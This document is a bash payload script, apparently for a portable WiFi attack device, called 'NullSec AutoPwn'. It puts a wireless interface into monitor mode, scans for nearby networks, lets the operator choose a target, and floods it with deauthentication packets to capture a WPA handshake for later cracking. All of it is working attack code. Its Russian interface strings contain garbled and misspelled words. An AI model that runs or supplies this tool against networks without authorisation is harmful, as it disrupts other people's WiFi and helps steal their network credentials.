#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: NullSec AutoPwn
# Author: bad-antics
# Description: Automated WiFi attack - scans, selects targets, captures
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
LOG_FILE="$LOOT_DIR/logs/autopwn_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$LOOT_DIR"/{handshakes,creds,probes,pmkid,logs}

# Logging function
log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; LOG "$1"; }

# --- INTRODUCTION ---
PROMPT "NULLSEC AUTO-PWN

Автоматическая WiFi-цепочка атак:
- Сканирование сети
- Выбор цели  
- Захват handshake
- Посбор PMKID

Нажмите OK для начала сканирования."

# --- DETECT INTERFACES ---
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    if [ -d "/sys/class/net/$iface" ]; then
        MONITOR_IF="$iface"
        break
    fi
done

if [ -z "$MONITOR_IF" ]; then
    # Try to create monitor mode
    for iface in wlan1 wlan2; do
        if [ -d "/sys/class/net/$iface" ]; then
            airmon-ng start $iface 2>/dev/null
            MONITOR_IF="${iface}mon"
            [ -d "/sys/class/net/$MONITOR_IF" ] && break
        fi
    done
fi

if [ -z "$MONITOR_IF" ] || [ ! -d "/sys/class/net/$MONITOR_IF" ]; then
    ERROR_DIALOG "Нет интерфейса монитора!

Включите режим монитор первым:
airmon-ng start wlan1"
    exit 1
fi

LOG "Использую интерфейс: $MONITOR_IF"

# --- Отсканирование СЕТЕЙ ---
LOG "Сканирование сетей..."
SPINNER_START "Отсканирование WiFi сетей..."

rm -f /tmp/autopwn_scan*
timeout 20 airodump-ng "$MONITOR_IF" -w /tmp/autopwn_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
sleep 20
kill $SCAN_PID 2>/dev/null
killall airodump-ng 2>/dev/null

SPINNER_STOP

# Parse networks into arrays
declare -a BSSIDS CHANNELS ESSIDS POWERS
idx=0

while IFS=',' read -r bssid first last channel speed priv cipher auth power beacons iv lan id essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    
    essid=$(echo "$essid" | tr -d ' ' | head -c 20)
    [ -z "$essid" ] && essid="[Hidden]"
    channel=$(echo "$channel" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')
    
    BSSIDS[$idx]="$bssid"
    CHANNELS[$idx]="$channel"
    ESSIDS[$idx]="$essid"
    POWERS[$idx]="$power"
    
    idx=$((idx + 1))
    [ $idx -ge 15 ] && break
done < /tmp/autopwn_scan-01.csv

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "Сети не найдены!

Попытайтесь подвинуть в другое место
или проверьте монитор."
    exit 1
fi

# --- ВЫБОР ЦЕЛИ ---
СЕТЬ_LIST="Найдено $idx сетей:

"
for i in $(seq 0 $((idx-1))); do
    СЕТЬ_LIST="${СЕТЬ_LIST}$((i+1)). ${ESSIDS[$i]} (${POWERS[$i]}dBm)
"
done

TARGET_NUM=$(NUMBER_PICKER "Выберите цель (1-$idx):" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;;
esac

# Validate selection
TARGET_NUM=$((TARGET_NUM - 1))
[ $TARGET_NUM -lt 0 ] && TARGET_NUM=0
[ $TARGET_NUM -ge $idx ] && TARGET_NUM=$((idx - 1))

TARGET_BSSID="${BSSIDS[$TARGET_NUM]}"
TARGET_CHANNEL="${CHANNELS[$TARGET_NUM]}"
TARGET_ESSID="${ESSIDS[$TARGET_NUM]}"

log "Выбранная цель: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"

# --- ВЫБОР ДОЛГОВЕЧНОСТИ ---
DURATION=$(NUMBER_PICKER "Время полвата (сек):" 60)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;;
esac
[ $DURATION -lt 10 ] && DURATION=10
[ $DURATION -gt 300 ] && DURATION=300

# --- CONFIRM ATTACK ---
resp=$(CONFIRMATION_DIALOG "Attack $TARGET_ESSID?

BSSID: $TARGET_BSSID
Channel: $TARGET_CHANNEL
Длительность: ${DURATION}s

Select YES to attack.")

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Атака отменена"
    exit 0
fi

# --- ВЫПОЛНЕНИЕ АТАКИ ---
LOG "Начинаю атаку на $TARGET_ESSID"

CAPTURE_FILE="$LOOT_DIR/handshakes/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"

# Set channel
iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null

# Start capture
airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
    -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
CAPTURE_PID=$!

sleep 3

# Deauth bursts
LOG "Отправляю пакеты деаутентификации..."
DEAUTH_COUNT=0
START=$(date +%s)

while [ $(($(date +%s) - START)) -lt $DURATION ]; do
    aireplay-ng -0 5 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    DEAUTH_COUNT=$((DEAUTH_COUNT + 5))
    sleep 5
    
    # Check for handshake
    if [ -f "${CAPTURE_FILE}-01.cap" ]; then
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            LOG "HANDSHAKE CAPTURED!"
            ALERT "Хэндшейк захвачен для $TARGET_ESSID!"
            break
        fi
    fi
done

# Cleanup
kill $CAPTURE_PID 2>/dev/null
killall airodump-ng aireplay-ng 2>/dev/null

# --- RESULTS ---
HS_FOUND="No"
if [ -f "${CAPTURE_FILE}-01.cap" ]; then
    if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        HS_FOUND="YES!"
    fi
fi

PROMPT "АТАКА ЗАВЕРШЕНА

Цель: $TARGET_ESSID
Отправлено деаутов: $DEAUTH_COUNT
Хендшейк: $HS_FOUND

Капчур сохранён:
$CAPTURE_FILE

Нажмите OK для выхода."

log "Атака завершена. Хендсейк: $HS_FOUND"
